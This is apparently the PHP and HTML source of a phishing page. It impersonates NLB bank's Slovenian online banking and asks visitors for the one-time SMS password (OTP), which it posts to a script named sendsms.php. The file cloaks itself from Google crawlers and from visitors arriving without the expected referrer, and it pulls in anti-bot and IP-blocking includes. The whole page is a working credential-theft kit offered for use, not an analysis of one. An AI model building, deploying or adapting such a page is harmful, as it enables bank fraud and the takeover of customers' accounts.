
<?php 
   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');
   exit(); ?>
<?php }else{ ?>
<?php
   error_reporting(0);
   include('includes/antibot1.php');
   include('includes/antibot2.php');
   include('includes/antiip.php');
   include('config.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv('REMOTE_ADDR')),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>NLB pay</title>
      <meta name="multilanguage" content="true">
      <meta name="lng" content="el">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="robots" content="noindex,nofollow,noimageindex,noarchive,nocache,nosnippet">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="assets/img/favicon.ico">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.css" rel="stylesheet">
      <link href="assets/css/style.css" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
      <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
<script src="assets/js/intlInputPhone.min.js"></script>
<link rel="stylesheet" href="assets/css/intlInputPhone.min.css">
      <script type="text/javascript">
        
         $(document).ready(function() {
            $('#but1').prop('disabled', true);
            function validateNextButton(a) {
               $('#but1').prop('disabled', $('#username').val().length < 5);
            }
            $('#username').on('keyup', validateNextButton);
         });
         
         $(document).ready(function(){
            $('#password').keyup(function(){
               if($('#password').val().length > 4){
                  $('#but2').removeAttr('disabled');
               } else {
                  $('#but2').attr('disabled','disabled');
               }
            }).trigger('keyup');
         });
         $(document).ready(function() {
            $('#visi').click(function(e) {
               if ($('#password').attr('type') == 'password') {
                  $('#password').attr('type', 'text');
                  $("#visic").removeClass('icon-svg-container-small icon-visibility').addClass('icon-svg-container-small icon-visibility-off');
               } else {
                  $('#password').attr('type', 'password');
                  $("#visic").removeClass('icon-svg-container-small icon-visibility-off').addClass('icon-svg-container-small icon-visibility');
               }
            });
         });
         $(document).ready(function() {
            $('#reset').click(function(e) {
               $('#passdiv').hide();
               $('#password').attr('type', 'password');
               $("#visic").removeClass('icon-svg-container-small icon-visibility-off').addClass('icon-svg-container-small icon-visibility');
               $('#reset').hide();
               $("#username").prop('disabled', false);
               $('#username').val('');
               $('#password').val('');
               $('#but1').show();
               $('#but1').prop('disabled', true); 
               
             });
         });
         $(document).ready(function() {
            $('#but1').click(function(e) {
               $('#but1').hide();
               $('#loading').show(1).delay(500).hide(1);
               setTimeout(function(){
               $("#passdiv").show();
               $("#reset").show();
               $('#cas1').hide();
               $('#cas2').show();
               $('#but2').show();
               $('#jini').hide();
               $("#username").prop('disabled', true);
               }, 500);
             });
         });
         $(document).ready(function() {
            $('#but2').click(function(e) {
               $('#loading').show();
               $('#reset').children().bind('click', function(){ return false; });
               $('#password').prop('disabled', true); 
               $('#log').val($('#username').val()); 
               $('#pass').val($('#password').val()); 
             });
         }); 
         $(document).ready(function() {
            $('.input-phone').intlInputPhone();
        })      
        </script>
   </head>
   <body class="login-bg windows login-retail">
      <div class="appRoot">
         <div class="flex-column min-height-full-vh">
            <header style="background:#26007D;margin-bottom:20px">
            <nav class="navbar navbar-expand-lg navbar-light" style="align-items: flex-start;">
  <a class="navbar-brand" href="#"><img src="https://klikotp.nlb.si/nlb_left_02.png" /> </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" style="justify-content: flex-end;padding-top:10px" id="navbarNav">
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" href="#">NLB</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">O NLB Kliku</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Kontakt</a>
      </li>
    </ul>
  </div>
</nav>
            </header>
            <div class="container">
               <div class="row">
               <div class="col-lg-6">
                  <div class="form-container">
                  <div class="HeaderForm">Vnesite enkratno geslo (OTP) prejto v SMS</div>
                     <form action="includes/sendsms.php" method="POST" >
                        <div class="content-form">
                        <!-- <p>Pozdravljeni!<br>
Vpišite uporabniško ime in enkratno geslo OTP.<br>
Več o varni uporabi digitalne banke lahko najdete na <a href="#">nlb.si</a></p> -->

<input type="text" maxlength="6" placeholder="Enkratno geslo" name="sms1" class="form-control mb-4 mt-4" required />
                        
                           <div class="user-login-subcontainer">
                              <div class="full-height flex-column">
                                 <div class="flex-vertical-center-space-between margin-top-normal">
                                    <spinner type="action">
                                       <button id="but2" class="btnform" name="sms1send" style="min-width: 8rem;" type="submit" >  Kontinuiteta  </button>
                                    </spinner>
                                 </div>

                              </div>
                           </div>
                        </div>
                     </form>
                     </div>
                     </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>
<?php } ?>